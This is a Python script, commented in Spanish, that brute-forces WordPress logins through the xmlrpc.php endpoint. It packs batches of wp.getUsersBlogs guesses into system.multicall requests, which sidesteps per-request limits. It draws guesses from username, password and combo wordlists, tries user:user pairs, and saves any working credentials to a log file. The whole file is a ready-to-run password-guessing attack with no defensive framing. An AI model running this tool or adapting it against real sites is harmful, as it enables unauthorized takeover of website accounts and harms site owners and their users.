import os
import sys
import time
import xmlrpc.client

def ejecutar_bruteforce_multicall(xmlrpc_url, credenciales, batch_size, output_dir, success_file, debug=False):
    """
    Ejecuta el ataque en batches usando xmlrpc.client.MultiCall.
    Retorna True si se encuentra alguna credencial válida; de lo contrario, False.
    Se agregó la opción debug para imprimir información extra sobre cada resultado.
    """
    server = xmlrpc.client.ServerProxy(xmlrpc_url)
    batch_calls = []
    call_details = []
    procesadas = 0
    total_combinaciones = len(credenciales)

    for (usuario, contrasena) in credenciales:
        batch_calls.append((usuario, contrasena))
        call_details.append((usuario, contrasena))
        if len(batch_calls) == batch_size:
            multicall = xmlrpc.client.MultiCall(server)
            for (u, p) in batch_calls:
                multicall.wp.getUsersBlogs(u, p)
            try:
                resultados = multicall()
            except Exception as e:
                print(f"[!] Error en multicall: {e}")
                resultados = [None] * len(batch_calls)
            # Iteramos por índice, atrapando cualquier Fault
            for idx in range(len(batch_calls)):
                try:
                    resultado = resultados[idx]
                except xmlrpc.client.Fault as fault:
                    resultado = fault
                u, p = call_details[idx]
                if debug:
                    print(f"DEBUG: Combinación {u}:{p} -> resultado: {resultado} (tipo: {type(resultado)})")
                # Aquí comprobamos: si no es Fault, y es una lista (o tupla) con al menos un elemento, consideramos válidas las credenciales.
                if not isinstance(resultado, xmlrpc.client.Fault) and isinstance(resultado, (list, tuple)) and len(resultado) > 0:
                    print(f"[+] Credenciales válidas encontradas: {u}:{p}")
                    with open(success_file, "a", encoding="utf-8") as sf:
                        sf.write(f"{u}:{p}\n")
                    return True
            procesadas += len(batch_calls)
            print(f"[*] Combinaciones procesadas: {procesadas}/{total_combinaciones}")
            batch_calls = []
            call_details = []
            time.sleep(0.5)

    if batch_calls:
        multicall = xmlrpc.client.MultiCall(server)
        for (u, p) in batch_calls:
            multicall.wp.getUsersBlogs(u, p)
        try:
            resultados = multicall()
        except Exception as e:
            print(f"[!] Error en multicall: {e}")
            resultados = [None] * len(batch_calls)
        for idx in range(len(batch_calls)):
            try:
                resultado = resultados[idx]
            except xmlrpc.client.Fault as fault:
                resultado = fault
            u, p = call_details[idx]
            if debug:
                print(f"DEBUG: Combinación {u}:{p} -> resultado: {resultado} (tipo: {type(resultado)})")
            if not isinstance(resultado, xmlrpc.client.Fault) and isinstance(resultado, (list, tuple)) and len(resultado) > 0:
                print(f"[+] Credenciales válidas encontradas: {u}:{p}")
                with open(success_file, "a", encoding="utf-8") as sf:
                    sf.write(f"{u}:{p}\n")
                return True
        procesadas += len(batch_calls)
        print(f"[*] Combinaciones procesadas: {procesadas}/{total_combinaciones}")

    return False


def run_wordpress_bruteforce(target, batch_size=10, debug=False):
    """
    Realiza fuerza bruta contra el endpoint XML-RPC de WordPress usando system.multicall.

    Flujo:
      1. Si existe la carpeta wordlists/<target_clean>/ y se encuentran:
         - Ambos archivos (users.txt y passwords.txt): se prueban todas las combinaciones.
         - Solo users.txt: se carga la lista por defecto de contraseñas (top_wordpress_passwords.txt) y se prueban las combinaciones.
         Además, se intenta el escenario user:user para cada usuario.
      2. Independientemente de lo anterior, se prueba la lista combinada de credenciales desde
         wordlists/misc/common_credentials.txt (formato usuario:contraseña).

    Se detiene en cuanto se encuentran credenciales válidas.
    """
    # Asegurarse de que el target incluya el esquema
    if not target.startswith("http://") and not target.startswith("https://"):
        target = "http://" + target
    target_clean = target.replace("http://", "").replace("https://", "").rstrip("/")
    xmlrpc_url = target.rstrip("/") + "/xmlrpc.php"

    # Directorio para logs
    output_dir = os.path.join("logs", target_clean, "http", "http_wordpress_bruteforce")
    os.makedirs(output_dir, exist_ok=True)
    success_file = os.path.join(output_dir, "success.txt")

    # --- 1. Intentar con listas personalizadas ---
    custom_dir = os.path.join("wordlists", target_clean)
    users_custom = []
    pass_custom = []
    if os.path.isdir(custom_dir):
        user_file = os.path.join(custom_dir, "users.txt")
        pass_file = os.path.join(custom_dir, "passwords.txt")
        if os.path.isfile(user_file):
            try:
                with open(user_file, "r", encoding="utf-8") as f:
                    users_custom = [line.strip() for line in f if line.strip()]
                print(f"[*] Se cargaron {len(users_custom)} usuarios personalizados desde {user_file}")
            except Exception as e:
                print(f"[!] Error al leer {user_file}: {e}")
        if os.path.isfile(pass_file):
            try:
                with open(pass_file, "r", encoding="utf-8") as f:
                    pass_custom = [line.strip() for line in f if line.strip()]
                print(f"[*] Se cargaron {len(pass_custom)} contraseñas personalizadas desde {pass_file}")
            except Exception as e:
                print(f"[!] Error al leer {pass_file}: {e}")

    if users_custom or pass_custom:
        print("[*] Intentando combinaciones personalizadas...")
        # Caso 1: Usuarios y contraseñas personalizados
        if users_custom and pass_custom:
            credenciales = [(u, p) for u in users_custom for p in pass_custom]
            print(f"[*] Probando {len(credenciales)} combinaciones (usuarios personalizados x contraseñas personalizadas)...")
            if ejecutar_bruteforce_multicall(xmlrpc_url, credenciales, batch_size, output_dir, success_file, debug):
                return
        # Caso 2: Solo usuarios personalizados (se usa lista por defecto de contraseñas)
        elif users_custom and not pass_custom:
            default_pass_file = os.path.join("wordlists", "misc", "top_wordpress_passwords.txt")
            if os.path.isfile(default_pass_file):
                try:
                    with open(default_pass_file, "r", encoding="utf-8") as f:
                        default_passwords = [line.strip() for line in f if line.strip()]
                    print(f"[*] Se cargaron {len(default_passwords)} contraseñas por defecto desde {default_pass_file}")
                except Exception as e:
                    print(f"[!] Error al leer {default_pass_file}: {e}")
                    default_passwords = []
            else:
                print(f"[!] No se encontró la lista por defecto {default_pass_file}")
                default_passwords = []
            if default_passwords:
                credenciales = [(u, p) for u in users_custom for p in default_passwords]
                print(f"[*] Probando {len(credenciales)} combinaciones (usuarios personalizados x contraseñas por defecto)...")
                if ejecutar_bruteforce_multicall(xmlrpc_url, credenciales, batch_size, output_dir, success_file, debug):
                    return
        # Bloque adicional: Probar usuario:usuario
        if users_custom:
            credenciales = [(u, u) for u in users_custom]
            print(f"[*] Probando {len(credenciales)} combinaciones (usuario:usuario)...")
            if ejecutar_bruteforce_multicall(xmlrpc_url, credenciales, batch_size, output_dir, success_file, debug):
                return
        print("[-] No se encontraron credenciales válidas usando listas personalizadas.")

    # --- 2. Intentar con lista combinada por defecto ---
    default_combo_file = os.path.join("wordlists", "misc", "common_credentials.txt")
    if os.path.isfile(default_combo_file):
        try:
            with open(default_combo_file, "r", encoding="utf-8") as f:
                combos = [line.strip() for line in f if line.strip()]
            print(f"[*] Se cargaron {len(combos)} combos desde {default_combo_file}")
        except Exception as e:
            print(f"[!] Error al leer {default_combo_file}: {e}")
            combos = []
        if combos:
            credenciales = []
            for combo in combos:
                if ":" in combo:
                    u, p = combo.split(":", 1)
                    credenciales.append((u.strip(), p.strip()))
            print(f"[*] Probando {len(credenciales)} combinaciones desde lista combinada...")
            if ejecutar_bruteforce_multicall(xmlrpc_url, credenciales, batch_size, output_dir, success_file, debug):
                return
        else:
            print("[!] La lista combinada está vacía.")
    else:
        print(f"[!] No se encontró la lista combinada de credenciales: {default_combo_file}")

    print("[-] Bruteforce finalizado sin encontrar credenciales válidas.")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python http_wordpress_bruteforce.py <target> [debug]")
        sys.exit(1)
    target = sys.argv[1]
    debug_flag = (len(sys.argv) >= 3 and sys.argv[2].lower() == "debug")
    run_wordpress_bruteforce(target, batch_size=10, debug=debug_flag)
